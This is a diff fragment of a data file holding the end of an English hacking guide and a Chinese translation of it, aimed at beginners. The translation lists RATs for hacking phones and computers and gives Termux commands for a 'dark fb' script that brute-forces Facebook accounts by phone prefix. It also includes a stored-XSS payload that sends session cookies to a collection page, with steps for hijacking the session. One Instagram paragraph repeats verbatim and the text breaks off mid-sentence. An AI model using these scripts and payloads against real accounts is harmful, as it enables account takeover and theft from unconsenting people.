+    \n## CONCLUSION\n\nFor the newbie, it’s quite hard to find out from where he can\
+    \ get hands on practice. This article covers all the basic and most commonly used\
+    \ hacked devices and methods or strategies to perform the attack. This is a complete\
+    \ guide to learn how to hack for beginner’s free of cost. This article makes the\
+    \ following terms clear for the beginners to get started on the hack track.\n"
+  trans: "\n# 计算机黑客攻击指南\n\n## 简介\n\n黑客攻击通常指未经授权侵入网络或计算机，通常由一名或多名“黑客”实施。然而，黑客可以是任何人，他们的活动不一定是恶意的或未经授权的才算作黑客攻击。黑客攻击可以指利用技能以聪明的方式实现目标。他们可以是像你我这样的个人。他们可以单独行动，也可以受雇于组织，为好或为坏服务。通常，他们试图修改安全系统以实现其目标。\n\
+    \n许多组织雇佣黑客作为其员工的一部分。这些黑客利用他们的技能来发现组织安全中的漏洞。这样做是为了发现并修复弱点，防止恶意黑客攻破安全系统。\n\n###\
+    \ 黑客类型\n\n白帽、黑帽和灰帽指的是黑客与他们攻击的系统之间的关系。\n\n#### 黑帽黑客\n\n“黑帽”一词源于西部电影，其中坏人戴黑帽子，好人戴白帽子。黑帽黑客是指试图未经授权进入系统或网络，并出于恶意原因加以利用的个人。黑帽黑客没有任何许可或授权来攻击其目标。他们试图通过破坏安全系统、更改网站和网络的功能或关闭系统来造成损害。他们这样做通常是为了窃取或获取密码、财务信息和其他个人数据。\n\
+    \n#### 白帽黑客\n\n另一方面，白帽黑客被视为好人，他们与组织合作以增强系统的安全性。白帽黑客有权在规定的交战规则内接触目标并对其进行攻击。白帽黑客通常被称为道德黑客。该人员专精于道德黑客工具、技术和方法论，以保护组织的信息系统。与黑帽黑客不同，道德黑客在合法获许的情况下利用安全网络并寻找后门。白帽黑客总会披露他们在公司安全系统中发现的每一个漏洞，以便在恶意行为者利用这些漏洞之前进行修复。Facebook、Microsoft\
+    \ 和 Google 等财富 50 强公司也使用白帽黑客。\n\n#### “灰帽”黑客\n\n灰帽黑客以黑帽黑客的方式利用网络和计算机系统，但没有任何恶意意图，会向执法机构或情报机构披露所有漏洞和弱点。通常，灰帽黑客在网上冲浪并侵入计算机系统，以通知管理员或所有者其系统/网络包含一个或多个必须立即修复的漏洞。灰帽黑客也可能勒索被黑客攻击者，提出以微薄的费用修复缺陷。\n\
+    \n## 最流行的黑客技术——社会工程学\n\n社会工程学是网络安全专业人员用来谈论我们所有人都容易遭受数据窃取的多种方式的通用术语。社会工程学通常是指利用人类乐于助人的本能来达到犯罪目的的过程。社会工程学问题已经演变多年，但今天它是网络攻击和网络恐怖主义的主要来源。通过技术缺陷安装的恶意软件仅占\
+    \ 3% 的实例，而社会工程学攻击高达 97%。黑客攻击模式已从针对软件或硬件转变为更专注于人类漏洞。\n\n### 不同类型的社会工程学攻击\n\n####\
+    \ 网络钓鱼\n\n91% 的数据泄露以网络钓鱼的形式出现，使其成为被利用最多的社会工程学形式。网络钓鱼是一种网络犯罪，通过向目标发送电子邮件，诱骗个人提供个人信息、银行和信用卡详情、电子邮件或社交媒体账户密码或其他机密信息。网络钓鱼骗局通常表现出以下特征：\n\
+    \n*   试图获取个人信息、密码或其他银行相关详情。\n*   发送缩短的链接，重定向到可以追踪你详细信息的受感染网站。\n*   结合紧迫感、威胁或恐惧，操纵受害者在思考前做出反应。\n\
+    \n这种社会工程学攻击的一个完美例子是 2018 年美国报税日后一个月发生的网络钓鱼骗局，当时犯罪分子发送误导性电子邮件索要纳税申报详情。这是为了获取账户访问权并利用信息提交欺诈性纳税申报。\n\
+    \n#### 冒充\n\n网络犯罪分子经常寻找攻破系统的最薄弱环节，而最薄弱的环节往往是人类。冒充需要付出大量努力来了解目标并规划攻击，因此这是最不常见的社会工程学形式。冒充者为实施攻击可能承担的一些常见角色包括\
+    \ IT 高管、经理、审计师或同事。通常，冒充攻击针对具有权威的角色，因为当人们收到来自权威人士的要求共享信息的请求时，他们会立即行动，而不验证发件人的真实身份。尽管与其他形式的社会工程学攻击相比，冒充攻击并不常见，但\
+    \ 2017 年此类攻击激增了近 400%。\n\n#### 语音钓鱼\n\n语音钓鱼，或称 vishing，作为一种社会工程学形式正在快速增长。语音钓鱼攻击是指攻击者致电目标组织，试图通过电话获取信息和凭证。另一种语音钓鱼骗局是攻击者试图让电话另一端的人在其电脑上执行某些操作。这些操作包括运行桌面脚本和查看受感染的网站。这些攻击难以监控和追踪，不幸的是，在人力资源部门、客户服务、销售和市场营销等部门工作的员工极易受到这些攻击。从\
+    \ 2012 年到 2016 年，一群网络犯罪分子实施了大规模的 IRS 语音钓鱼骗局。在这四年里，美国有 15,000 多名受害者因这一复杂的骗局损失了“数亿美元”，且\
+    \ 50,000 多人的个人信息遭到泄露。\n\n#### 短信钓鱼\n\n短信钓鱼是“SMS phishing”（短信网络钓鱼）的混成词，类似于网络钓鱼，但通过短信实施。短信钓鱼犯罪分子通常向通过各种黑帽技术（如网络爬虫、数据泄露或随机号码生成器）获取的联系号码发送信息。骗子发送的信息使用不同技术诱导你分享他们想要的信息。他们可能承诺提供理想产品的优惠券或折扣，或者冒充你的银行以验证你的账户详情。你也可能收到来自“5000”等可疑号码或其他与电子邮件转短信服务相关的号码发来的短信，这些可能是自动化的。据\
+    \ NBC Nightly News 报道，一起短信钓鱼骗局试图诱骗受害者通过电话输入私人信息来激活新信用卡。在另一起短信钓鱼骗局中，用户被告知其在线账户即将过期，需要通过在假网站上输入密码来续订账户。\n\
+    \n## 常见黑客工具\n\n为了实施完美的黑客攻击，黑客会实施各种各样的技术，例如：\n\n### Rootkit（根工具包/隐藏工具）\n\nRootkit\
+    \ 是一套程序或软件工具集，允许威胁行为者获得远程访问权限，以控制与互联网交互或连接的计算机系统。最初，Rootkit 的开发是为了在系统中打开一个后门以修复特定的软件问题。不幸的是，黑客现在利用该程序破坏合法操作员或用户对操作系统的控制。在受害者系统中安装\
+    \ Rootkit 有多种方法，最著名的是社会工程学和网络钓鱼攻击。一旦安装了 Rootkit，它就会秘密允许黑客访问和控制系统，给他们机会瘫痪系统或窃取关键数据。\n\
+    \n### 键盘记录器\n\n这是一种专门设计的工具，用于记录系统上按下的每一个按键。键盘记录器通过在通过计算机键盘输入时挂钩 `API`（应用程序编程接口）来记录每一个按键。记录的文件随后被保存，其中包括用户名、网站访问详情、截图、打开的应用程序等数据。只要输入，键盘记录器就能捕获信用卡号、个人消息、手机号码、密码和其他详细信息。通常，键盘记录器以恶意软件的形式到达，允许网络犯罪分子窃取敏感数据。\n\
+    \n### 漏洞扫描器\n\n漏洞扫描器对网络、计算机、通信系统等中的各种系统弱点进行分类和检测。这是道德黑客用来寻找潜在漏洞并立即修复的最常见做法之一。另一方面，黑帽黑客也可以使用漏洞扫描器来检查系统的潜在弱点，以便利用系统。\n\
+    \n### 5. 黑客和罪犯常用的软件\n\n除了使用不同的攻击技术从用户和组织那里破解和窃取密码外，网络犯罪分子倾向于使用密码破解和解密软件。以下是一些流行的软件：\n\
+    \n#### John The Ripper (JTR)\n\n该软件旨在破解一些最复杂的密码，因为它可以“离线”破解密码。JTR 接受不同的文本字符串样本，通常称为“字典”，其中包含字典中常见的复杂和流行单词或之前破解过的真实密码。该工具同时使用密钥和加密算法，并将输出与加密字符串进行比较。JTR\
+    \ 还可用于对字典攻击执行各种变体。\n\n#### Aircrack-ng\n\n该工具/软件用于破解无线密码；由训练有素的用户使用时效果非常好。Aircrack-ng\
+    \ 是一款 802.11 WPA-PSK 和 WEP 密钥破解软件，当在监听模式下捕获到足够的数据包时，可以恢复密码。在渗透测试和审计无线网络方面经验丰富的专业人士可以从该软件中获得最佳效果。\n\
+    \n#### Cain and Abel\n\n这款极其流行的工具通常简称为“Cain”。其核心是 Cain and Abel 密码破解工具，用于恢复 Microsoft\
+    \ Windows 的密码，但也可被全球的黑客和罪犯用作密码破解工具。\n\n#### THC Hydra\n\n该工具与 JTR 类似，不同之处在于 THC\
+    \ Hydra 在线工作。这款黑客工具支持多种网络协议，如 `LDAP`、`SSH`、`VNC`、`Mail` (`IMAP`、`POP3` 等)、`SMB`\
+    \ 和数据库。THC Hydra 是一款必不可少的黑客工具，用于登录稳定的网络，使用字典和暴力攻击破解登录页面中复杂的强密码。\n\n## 常见密码破解技术\n\
+    \n### SQL 注入攻击\n\n结构化查询语言 (`SQL`) 旨在利用数据库中的数据。SQL 注入是一种网络攻击，它通过 `SQL` 语句针对数据库以欺骗系统。这种攻击通过网站界面执行，试图通过数据库发出\
+    \ `SQL` 命令以窃取用户名、密码和其他数据库信息。编码不善的 Web 应用程序和网站容易受到 SQL 注入攻击，因为这些基于 Web 的应用程序包含用户输入字段（如搜索和登录页面、产品和支持请求表单、评论部分等），这些字段脆弱且易于通过操纵代码进行攻击。\n\
+    \n### 分布式拒绝服务攻击 (DDoS)\n\nDDoS 是一种恶意攻击，它扭曲正常流量以进入服务器，淹没网络流量（导致拒绝服务）。它就像交通堵塞堵塞道路，阻止正常交通到达目的地。易于连接网络的设备（如计算机、物联网设备、手机等）容易受到\
+    \ DDoS 攻击。\n\n### 猜密码游戏\n\n顾名思义，这种技术完全依赖于猜测用户的密码。像“password”、“qwerty”、“admin”、“default”、你的名字，甚至你的生日等密码常被用作默认密码。如果用户未更改默认密码，或在设置新密码时粗心大意，则很容易被黑客攻击。\n\
+    \n### 暴力破解攻击\n\n暴力破解攻击是黑客和网络犯罪分子针对 Web 应用程序最常用的技术之一。此类攻击的主要重点是使用试错技术猜测用户的密码或个人识别号\
+    \ (`PIN`)，以获取用户账户的访问权限。暴力破解攻击会有条不紊地尝试一个接一个的密码，直到攻击者成功登录目标账户。例如，攻击者将使用自动化工具尝试 Password，然后是\
+    \ Password1、Password2、Password3 等，并在定义的键空间（a-z、A-Z、0-1 等）内迭代每一个可能的选项。通过使用机器人在几秒钟内测试大小写字母和数字的随机组合以生成你账户的正确密码，攻击者可以访问你的账户！还有一种称为反向暴力破解攻击的类似技术，攻击者不是黑客攻击特定用户，而是尝试使用单个常用密码攻击多个账户。\n\
+    \n### 字典攻击\n\n字典攻击使用预定义的字典，通过系统化过程针对单个用户名或整个组织的用户名以获取系统访问权限。由于许多用户经常使用字典中常见的基本单词作为密码，因此黑客使用此方法获得访问权限的可能性很高。几乎每种语言（真实和虚构）都有字典文件，甚至按流派或主题分类。例如，如果你的服务器名为\
+    \ Gandalf，那么包含《指环王》书籍和电影中的单词和语言的中土世界字典文件可能会很有效。阻止字典攻击的最佳方法是使用多词（随机组合的小写、大写字符和数字）密码。\n\
+    \n## 免费学习初学者黑客技术\n\n有数千种设备威胁在线隐私，也有数吨方法渗透这些设备。探索所有可能影响你隐私的主要黑客类型。免费学习初学者黑客技术，并保护自己免受所有这些类型的黑客攻击。\n\
+    \n### 1. 计算机黑客攻击\n\n计算机是打开通往黑客世界大门的主要设备之一。所有个人活动和商业事务都已转移到计算机上。每家公司都从普通的业务管理迁移到集中式计算机管理系统以进行商业活动。随着计算机在商业行业的兴起，机密信息更容易暴露给黑客和入侵者。计算机很容易被黑客攻击，只需几个简单技巧就能泄露所有个人数据。黑客攻击计算机比其他设备更容易简单的一个原因是，大多数组织不培训员工进行完整的计算机操作和安全措施。每家公司都应为员工提供适当的培训，以建立安全系统。那么，计算机如何被黑客攻击？嗯，有数吨方法可以黑客攻击计算机。一些需要物理接触机器，而一些可以远程黑客攻击计算机。黑客进入计算机最常用的方法是通过一种称为\
+    \ `RAT`（远程管理工具）的工具。市场上有大量远程管理工具，可以轻松让入侵者远程黑客攻击计算机。一些最流行的包括：\n\n*   `Nanocore`\n\
+    *   `Blackshades`\n*   `NjRAT`\n*   `JSpy`\n*   `DarkComet`\n\n你可以探索 2020 年所有顶级远程管理工具的列表。由于大多数初学者不知道如何使用这些工具。为了让新手更容易，我们制作了一些完整的分步教程，使用这些\
+    \ `RAT` 远程黑客攻击计算机，从而免费学习初学者黑客技术。你可以查看如何使用 `njrat` 远程黑客攻击计算机，甚至可以学习使用 `Kali Linux`\
+    \ 远程黑客攻击计算机。\n\n还有其他一些方法可以黑客攻击计算机，但这是黑客用来进入远程计算机最常用的方法。加分项是这种方法有极高的成功率。\n\n###\
+    \ 2. 智能手机黑客攻击\n\n手机随着时间推移进化到下一级并变得智能。正如我们所知，这些智能手机已经接管了我们过去在电脑上做的所有事情。现在智能手机让你掌握所有电脑操作。发送电子邮件、管理商务会议、官方视频会议以及娱乐如看电影、玩游戏和所有其他事情现在都可以通过智能手机访问。智能手机的主要用途之一是个人消息对话和工作电子邮件使用。随着智能手机让生活更轻松、所有事情触手可及，它也带来了一些隐私威胁，任何个人消息对话、私人媒体或其他商业机密信息都可能被黑客攻击，这会让受害者经历艰难时刻。问题是这些智能手机如何被黑客攻击？答案非常直接且简单。智能手机可以通过多种方法被黑客攻击，但像计算机黑客攻击一样，智能手机可以通过远程管理工具轻松被黑客攻击，这就是为什么这种方法非常流行且最常见，每个入侵者都试图使用一些安卓\
+    \ `RAT` 进入远程手机。市场上有大量远程管理工具，可以轻松让入侵者远程黑客攻击计算机。一些最流行的包括：\n\n*   `AndroRAT`\n* \
+    \  `SpyMax`\n*   `DroidJack`\n*   `SpyNote`\n*   `Dendroid`\n\n你可以探索 2020 年所有顶级安卓远程管理工具的列表。由于大多数初学者不知道如何使用这些工具。对于大多数用户来说，使用这些工具黑客攻击智能手机可能很棘手。为克服这个问题，我们制作了关于如何远程黑客攻击智能手机的完整分步教程。你可以探索以下教程免费学习初学者黑客技术。\n\
+    \n*   使用 `androrat` 远程黑客攻击智能手机\n*   使用 `droidjack` 远程黑客攻击智能手机\n*   使用 `spynote`\
+    \ 远程黑客攻击任何安卓手机\n\n你可能会通过这些为初学者和专业人士设计的完整分步教程学会所有黑客攻击智能手机的方法。还可以探索 2020 年 25 款顶级安卓黑客应用的列表。\n\
+    \n### 3. Facebook 黑客攻击\n\nFacebook 是世界巨大的社交网络，每天数百万人在此发帖并与朋友家人交谈。每个人都用 Facebook\
+    \ 和好友聊天，如果这些对话被黑客攻击并泄露到公开世界会怎样？如果任何机密信息泄露，可能会变得可怕。真的可能黑客攻击 Facebook 账户吗？当然可能，有多种技术。一些最常见的可导致\
+    \ FB 账户被黑的技术如下：\n\n*   通过网络钓鱼黑客攻击 Facebook 账户\n*   劫持 Cookie 以接管 Facebook 账户\n\
+    *   通过桌面网络钓鱼黑客攻击 Facebook 账户\n\n还有各种其他方法，但这些是最常见且成功率最高的。\n\n### 4. 网站黑客攻击\n\n\
+    在线信息在网站上运行，也称为 `www`（万维网）。整个互联网是托管网站的不同网络的组合。这些网站与世界共享信息。网站类型多样，有些是个人的，其他的用于商业。互联网上的每个网站都可能成为攻击的受害者。每天数百个网站被黑客攻击，用户数据泄露。如果网站数据落入错误之手，可能会造成真正的麻烦。问题是这些网站如何被黑客攻击？答案对于这种类型的黑客攻击并不那么简单，因为网站托管在不同的网络上，黑客攻击网站比计算机黑客攻击稍微困难一些。有大量方法可以黑客攻击网站，这取决于安全漏洞。黑客不断测试所有不同选项，直到他发现这些方法中的任何一种存在安全漏洞。这些是渗透测试人员和黑客最常用的网站黑客攻击方法。\n\
+    \n*   使用 `SQL 注入` 进行网站黑客攻击\n*   使用 `XXS` 或跨站脚本攻击网站\n*   `CSRF`（跨站请求伪造）利用\n*  \
+    \ `RFI`（远程文件包含）攻击\n\n还有许多其他方法，但这些是最常用的网站黑客攻击方法。如果网站由 `WordPress` 驱动，你可以查看以下专门针对黑客攻击基于\
+    \ WordPress 网站的方法。\n\n*   使用 `SQLMap` 黑客攻击 WordPress 网站\n*   使用 `WPScan` 进行 WordPress\
+    \ 网站黑客攻击\n\n希望这些文章能给你一个广阔的理解视角，你将通过这些最流行的网站黑客攻击方法了解所有关于网站黑客攻击的知识。\n\n### 5. 无线黑客攻击\
+    \ (WIFI 黑客攻击)\n\n互联网连接已从普通的有线连接转移到无线连接。这使得连接非常轻松且灵活。无论你在沙发上还是床上，设备都可以连接到互联网，轻松访问互联网。由于数据通过空气中的\
+    \ WiFi 传输，它打开了许多安全漏洞，因为你的网络可以被免费访问或黑客攻击以获取免费上网。数据包可以被捕获，个人或机密信息可能落入坏人之手，这可能会带来严重麻烦。有大量软件和工具可以让你进入某人的无线网络，并帮助你捕获数据包。你可以查看一些最流行的无线黑客相关工具和教程。\n\
+    \n*   如何破解 Wifi 密码\n*   Wifi 解除认证攻击\n*   `Wireshark` 网络分析仪\n*   `CowPatty` Wifi\
+    \ 密码破解工具\n*   `Aircrack-ng`\n\n还有大量其他用于 wifi 黑客攻击和分析的工具和应用。\n\n### 6. IP 黑客攻击\n\
+    \n`IP`（互联网协议）地址是分配给互联网上每个用户的唯一地址。互联网上的每个用户都有一个全世界独一无二的 `IP` 地址。简单来说，它就像家庭地址，没有其他人能拥有和你相同的地址。数据在不同机器间通过\
+    \ `IP` 地址传输。`IP` 地址很容易被黑客攻击，这可能泄露你的连接信息以及你访问互联网的家庭位置。如果有人知道你的 `IP`，就能像好莱坞电影中那样追踪到你的家。有很多方法获取某人的\
+    \ `IP` 地址。一些最好的 IP 抓取工具可以在本文中查看。如果你在玩游戏想知道对手玩家的 `IP`，可以使用 `Octosniff Xbox IP sniffer`。甚至可以通过用户名找出\
+    \ Skype 用户的 `IP` 地址，知道他们最初从哪里连接。你可以下载 `skype resolver` 来解析 Skype 用户名的 `IP` 地址。\n\
+    \n## 最新的 Facebook 黑客方法 100% 有效\n\n这种黑客攻击 Facebook 的方法是黑客用来黑客攻击 Facebook 账户的方法。在本文中，我们将尝试使用\
+    \ Termux 上最新的 dark fb 来黑客攻击 Facebook 账户。Dark fb 是一个用于黑客攻击 FB 的 Facebook 黑客工具。此更新是最新的大规模\
+    \ dark fb 脚本，你不需要登录。最新的反检查点 fb 黑客脚本是最新的 dark fb 脚本。你可以使用 termux 在不登录的情况下黑客攻击 fb。因此，你的\
+    \ Facebook 账户不会受到 Facebook 会话或检查点的影响。像往常一样，要使用最新的 dark fb 脚本，必须安装几个模块，即：\n\n```\n\
+    Pkg install python2\nPip2 install tqdm\nPip2 install requests\nPip2 install mechanize\n\
+    ```\n\n如果完成，请继续安装最新的 Termux Facebook 黑客脚本反检查点。请查看以下链接安装 Facebook 黑客工具的命令。在此处下载\
+    \ Facebook 黑客工具 接下来，运行以下命令以使用最新的 dark fb 脚本：\n\n```\nCd Sensei\npython2 main.py\n\
+    ```\n\n这里有 4 个选项或菜单选项：\n\n*   `[01]` 使用手机号破解 输入命令 01 使用手机号黑客攻击 Facebook\n*   `[02]`\
+    \ 使用邮箱破解 输入命令 02 使用邮箱地址黑客攻击 facebook 账户\n*   `[03]` 从好友列表和公开 `[登录]` 中破解 如果你要黑客攻击目标的\
+    \ Facebook 账户或从好友列表中破解，请选择 03（小心检查点，OK！）\n*   `[00]` 退出此程序 最后选择 00 退出登录\n\n这里我选择编号\
+    \ 01，即从手机号黑客攻击 fb。现在选择你将用哪个国家黑客攻击 Facebook 账户。有 5 个国家可以黑客攻击 Facebook 账户：\n\n*\
+    \   `[01]` 破解印度尼西亚账户\n*   `[02]` 破解孟加拉国账户\n*   `[03]` 破解巴基斯坦账户\n*   `[04]` 破解印度账户\n\
+    *   `[05]` 破解越南账户\n*   `[00]` 返回菜单\n\n在这个例子中我选择了印度尼西亚，所以输入命令编号 01 继续。在下一部分我们必须输入一个\
+    \ 3 位数字。这些 3 位数字稍后将用于使用 3 个数字后面的电话号码黑客攻击 Facebook 账户 例如，你要黑客攻击的 Facebook 号码是 +628123987\
+    \ *****，所以我们输入数字 123（+628 后面的 3 个数字....）这个 Facebook 黑客工具将尝试使用以 +628123 ****? 开头的号码登录\
+    \ 2000 个账户。等待破解过程完成。这就是最新的黑客攻击 Facebook 方法，100% 可以黑客攻击他人的 fb 账户。\n\n## 如何黑客攻击网站：在线黑客攻击网站示例\n\
+    \n比以往任何时候都有更多人访问互联网。这促使许多组织开发基于 Web 的应用程序，用户可以在线使用这些应用程序与组织互动。编写糟糕的 Web 应用程序代码可能被利用以获得对敏感数据和\
+    \ Web 服务器的未经授权的访问。在本教程中，你将学习如何黑客攻击网站，我们将向你介绍 Web 应用程序黑客技术以及你可以采取的保护措施以防范此类攻击。\n\
+    \n### 什么是 Web 应用程序？什么是 Web 威胁？\n\nWeb 应用程序（又称网站）是基于客户端-服务器模型的应用程序。服务器提供数据库访问和业务逻辑。它托管在\
+    \ Web 服务器上。客户端应用程序运行在客户端 Web 浏览器上。Web 应用程序通常用 `Java`、`C#`、`VB.Net`、`PHP`、`ColdFusion\
+    \ Markup Language` 等语言编写。Web 应用程序中使用的数据库引擎包括 `MySQL`、`MS SQL Server`、`PostgreSQL`、`SQLite`\
+    \ 等。大多数 Web 应用程序托管在可通过互联网访问的公共服务器上。这使得它们因易于访问而容易受到攻击。以下是常见的 Web 应用程序威胁。\n\n* \
+    \  **SQL 注入** – 此威胁的目标可能是绕过登录算法、破坏数据等。\n*   **拒绝服务攻击** – 此威胁的目标可能是拒绝合法用户访问资源\n\
+    *   **跨站脚本 XSS** – 此威胁的目标可能是在客户端浏览器上注入可执行代码。\n*   **Cookie/Session Poisoning（Cookie/会话投毒）**\
+    \ – 此威胁的目标是攻击者修改 cookie/会话数据以获得未经授权的访问。\n*   **Form Tampering（表单篡改）** – 此威胁的目标是修改表单数据，如电子商务应用程序中的价格，以便攻击者以优惠价格获取商品。\n\
+    *   **Code Injection（代码注入）** – 此威胁的目标是注入可在服务器上执行的代码，如 `PHP`、`Python` 等。该代码可以安装后门、泄露敏感信息等。\n\
+    *   **Defacement（篡改/破坏）** – 此威胁的目标是修改网站上显示的页面，并将所有页面请求重定向到包含攻击者信息的单个页面。\n\n###\
+    \ 如何保护你的网站免受黑客攻击？\n\n组织可以采取以下策略来保护自己免受 Web 服务器攻击。\n\n*   **SQL 注入** – 在将用户参数提交到数据库进行处理之前对其进行清理和验证，有助于降低通过\
+    \ SQL 注入被攻击的几率。`MS SQL Server`、`MySQL` 等数据库引擎支持参数化查询和预处理语句。它们比传统的 `SQL` 语句安全得多。\n\
+    *   **拒绝服务攻击** – 如果攻击是简单的 DoS，可以使用防火墙丢弃来自可疑 `IP` 地址的流量。网络的正确配置和入侵检测系统也有助于降低 DoS\
+    \ 攻击成功的几率。\n*   **跨站脚本** – 验证和清理通过 URL 传递的头部、参数、表单参数和隐藏值，有助于减少 XSS 攻击。\n*   **Cookie/Session\
+    \ Poisoning** – 可以通过加密 cookie 内容、在一段时间后使 cookie 超时、将 cookie 与创建它们时使用的客户端 `IP`\
+    \ 地址关联来防止此情况。\n*   **Form tempering（表单篡改）** – 可以通过在处理前验证和核实用户输入来防止此情况。\n*   **Code\
+    \ Injection（代码注入）** - 可以通过将所有参数视为数据而非可执行代码来防止此情况。清理和验证可用于实现此目的。\n*   **Defacement（篡改/破坏）**\
+    \ – 良好的 Web 应用程序开发安全策略应确保封堵访问 Web 服务器的常用漏洞。这可以是操作系统的正确配置、Web 服务器软件以及开发 Web 应用程序时的最佳安全实践。\n\
+    \n### 网站黑客技巧：在线黑客攻击网站\n\n在这个网站黑客实战场景中，我们将劫持位于 `www.techpanda.org` 的 Web 应用程序的用户会话。我们将使用跨站脚本读取\
+    \ cookie 会话 ID，然后用它来冒充合法用户会话。假设攻击者有权访问该 Web 应用程序，并且想要劫持使用同一应用程序的其他用户的会话。此攻击的目标可能是获得\
+    \ Web 应用程序的管理员访问权限，假设攻击者的访问账户是受限的。\n\n#### 开始\n\n打开 `http://www.techpanda.org/`\n\
+    \n出于练习目的，强烈建议使用 SQL 注入获取访问权限。请参考这篇文章了解如何操作的更多信息。登录邮箱是 `admin@google.com`，密码是 `Password2010`\n\
+    \n如果你成功登录，你将获得以下仪表板\n\n点击 Add New Contact（添加新联系人）\n\n在名字栏输入以下内容\n\n```\n<a href=#\
+    \ onclick=\\\"document.location='http://techpanda.org/snatch_sess_id.php?c='+escape(document.cookie);\\\
+    \">Dark</a>\n```\n\n此处，上述代码使用 `JavaScript`。它添加了一个带有 onclick 事件的超链接。当毫无戒心的用户点击链接时，事件会检索\
+    \ `PHP` cookie 会话 ID，并将其连同 URL 中的会话 ID 一起发送到 `snatch_sess_id.php` 页面。\n\n输入其余详细信息\n\
+    \n点击 Save Changes（保存更改）\n\n由于跨站脚本代码存储在数据库中，每当有访问权限的用户登录时，它都会被加载\n\n假设管理员登录并点击显示“Dark”的超链接\n\
+    \n他/她将获得一个在 URL 中显示会话 ID 的窗口。\n\n注意：该脚本可能将值发送到某个存储 `PHPSESSID` 的远程服务器，然后将用户重定向回网站，就好像什么也没发生一样。\n\
+    \n注意：你获得的值可能与此网页黑客教程中的不同，但概念是相同的。\n\n#### 使用 Firefox 和 Tamper Data 插件进行会话冒充。\n\
+    \n下面的流程图显示了完成此练习必须采取的步骤。你需要 Firefox 网络浏览器和 Tamper Data 插件。\n\n1.  打开 Firefox 并安装插件。\n\
+    2.  搜索 tamper data 然后点击安装\n3.  点击接受并安装…\n4.  安装完成后点击立即重启\n5.  如果 Firefox 中未显示菜单栏，请启用它\n\
+    6.  点击工具菜单然后选择 Tamper Data\n7.  你将获得以下窗口。\n    *   注意：如果窗口不为空，点击清除按钮\n8.  点击开始篡改菜单\n\
+    9.  切换回 Firefox 网络浏览器，输入 `http://www.techpanda.org/dashboard.php` 然后按回车键加载页面\n\
+    10. 你将从 Tamper Data 获得以下弹出窗口\n    *   弹出窗口有三个 (3) 选项。篡改选项允许你在提交到服务器之前修改 HTTP 头信息。\n\
+    \    *   点击它\n11. 你将获得以下窗口\n12. 复制你从攻击 URL 复制的 `PHP` 会话 ID 并粘贴在等号后面。\n13. 你的值现在应该看起来像这样\
+    \ `PHPSESSID=2DVLTIPP2N8LDBN11B2RA76LM2`\n14. 点击确定按钮\n15. 你将再次获得 Tamper data 弹出窗口\n\
+    16. 取消勾选询问“Continue Tampering?”的复选框\n17. 完成后点击提交按钮\n18. 你应该能看到仪表板\n    *   注意：我们没有登录，我们使用通过跨站脚本检索到的\
+    \ `PHPSESSID` 值冒充了一个登录会话。\n\n## 如何在不到 10 分钟内黑客攻击任何 Instagram 账户\n\n一位安全研究人员在发现一个严重漏洞后获得了\
+    \ 30,000 美元奖励，该漏洞可能使任何 Instagram 账户面临被黑客攻击的风险。在 Facebook 和 Instagram 近期增加针对关键账户接管漏洞发现的奖励后，印度安全研究人员\
+    \ Laxman Muthiyah 选择仔细研究这项照片分享服务。正如他在博客文章中所述，Muthiyah 探索了 Instagram 在处理忘记登录凭据的用户密码重置请求时是否存在漏洞。Muthiyah\
+    \ 发现，当用户通过 Instagram 的 Web 界面请求密码重置时，网站会向用户的电子邮件账户发送重置链接。\n\n一位安全研究人员在发现一个严重漏洞后获得了\
+    \ 30,000 美元奖励，该漏洞可能使任何 Instagram 账户面临被黑客攻击的风险。在 Facebook 和 Instagram 近期增加针对关键账户接管漏洞发现的奖励后，印度安全研究人员\
+    \ Laxman Muthiyah 选择仔细研究这项照片分享服务。正如他在博客文章中所述，Muthiyah 探索了 Instagram 在处理忘记登录凭据的用户密码重置请求时是否存在漏洞。Muthiyah\
+    \ 发现，当用户通过 Instagram 的 Web 界面请求密码重置时，网站会向用户的电子邮件账户发送重置链接。\n\n经过几分钟的测试，Muthiyah\
+    \ 找不到任何漏洞，于是将注意力转向智能手机用户如何恢复对其 Instagram 账户的访问。Muthiyah 发现，Instagram 为被锁定在账户外的用户提供了一种选择，请求将一个六位数的秘密安全码发送到他们的手机号码或电子邮件账户。如果输入该密码，用户可以重新获得对其\
+    \ Instagram 账户的访问权限。理论上，如果黑客能够输入该六位数安全码，他们就能闯入 Instagram 账户（并重置密码将合法所有者锁在外面。）现在，如果黑客设法获得了目标的电子邮件账户访问权限，或通过\
+    \ SIM 卡交换诈骗劫持了受害者的手机号码控制权，该密码可能会被窃取。但 Muthiyah 想知道，如果这两种选择都不可用，是否还有其他方式闯入账户。\n\
+    \nMuthiyah 意识到，黑客只需在 Instagram 接受该代码过期前的十分钟窗口期内，输入正确的六位数代码——该代码可能是 000000 到 999999\
+    \ 之间的任何组合。在十分钟内输入多达一百万个数字，以更改 Instagram 账户的密码。当然，Facebook 和 Instagram 不会坐视自动化脚本尝试暴力破解攻击以猜测正确的安全码。相反，它们设有速率限制，以检测何时多次尝试通过安全检查并减缓后续尝试——这意味着十分钟的机会窗口会过期。在\
+    \ Muthiyah 的测试中，他发现当他循环尝试 1000 次猜测 Instagram 账户的安全码时，250 个通过了，随后的 750 个请求被速率限制。然而，经过几天的测试，研究人员发现\
+    \ Instagram 的速率限制机制可以通过轮换 `IP` 地址（换句话说，不使用同一台计算机暴力破解恢复码）并从不同的 `IP` 地址并发发送请求来绕过。使用多个\
+    \ `IP` 发送并发请求允许我发送大量请求而不受限制。我们可以发送的请求数量取决于 `req` 的并发性和我们使用的 `IP` 数量。此外，我意识到代码在\
+    \ 10 分钟内过期，这使得攻击更难，因此我们需要数千个 `IP` 来执行攻击。” Muthiyah 表示，他使用了 1000 台不同的机器和 `IP` 来实现轻松的并发性，并在测试中发送了\
+    \ 200,000 个请求。他与 Facebook 和 Instagram 的安全团队分享了一个 YouTube 视频，演示了攻击的实际操作：当然，200,000\
+    \ 个请求还不足以保证输入正确的恢复密码以允许 Instagram 账户被劫持，这需要一百万个请求。Muthiyah 的调查结论是，在真实攻击中，需要 5000\
+    \ 个 `IP` 地址来黑客攻击一个 Instagram 账户。虽然这听起来数量很大，但实际上可以以低廉的价格轻松实现（Muthiyah 表示，如果使用 Google\
+    \ 或 Amazon 等云服务提供商，成本约为 150 美元）。所有 Instagram 用户都应该感激 Laxman Muthiyah 选择负责任地向 Instagram\
+    \ 安全团队披露安全漏洞，而不是通过将其出售给网络犯罪分子来获利。很容易想象，这种技术对许多有兴趣攻破 Instagram 账户的黑客极具吸引力，他们可能愿意支付比\
